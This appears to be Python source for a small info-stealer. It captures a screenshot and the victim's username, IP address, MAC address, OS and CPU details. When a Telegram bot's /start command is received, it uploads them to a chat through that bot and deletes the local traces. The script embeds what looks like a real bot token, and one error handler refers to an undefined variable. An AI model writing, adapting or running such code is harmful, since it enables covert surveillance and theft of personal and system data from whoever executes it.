import getpass
import os
import socket
import datetime
from uuid import getnode as get_mac
import pyautogui
import telebot
import psutil
import platform
from PIL import Image

BOT_TOKEN = "7737860469:AAHAQyrFJTIFl8Oj51pOkZGyMOG1_caA_O8"
bot = telebot.TeleBot(BOT_TOKEN)

TARGET_DIRECTORY = "/tmp/path"

start_time = datetime.datetime.now()

name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()
cpu = psutil.cpu_freq()

try:
    os.makedirs(TARGET_DIRECTORY, exist_ok=True)
except OSError as e:
    print(f"Error creating directory: {e}")
    bot.send_message(message.chat.id, f"Error creating directory: {e}")
    exit(1)


screenshot_path = os.path.join(TARGET_DIRECTORY, "screenshot.jpg")
pyautogui.screenshot(screenshot_path)

info_path = os.path.join(TARGET_DIRECTORY, "info.txt")
with open(info_path, "w") as file:
    file.write(f"Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n   Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")


@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        with open(info_path, "rb") as upfile, open(screenshot_path, "rb") as uphoto:
            bot.send_photo(message.chat.id, uphoto)
            bot.send_document(message.chat.id, upfile)

        os.remove(info_path)
        os.remove(screenshot_path)

    except FileNotFoundError:
        bot.send_message(message.chat.id, "Error: Files not found!")
    except Exception as e:
        bot.send_message(message.chat.id, f"An unexpected error occurred: {e}")

    bot.stop_polling()


bot.polling()

end_time = datetime.datetime.now()
work_speed = end_time - start_time
print(f"Total runtime: {work_speed}")

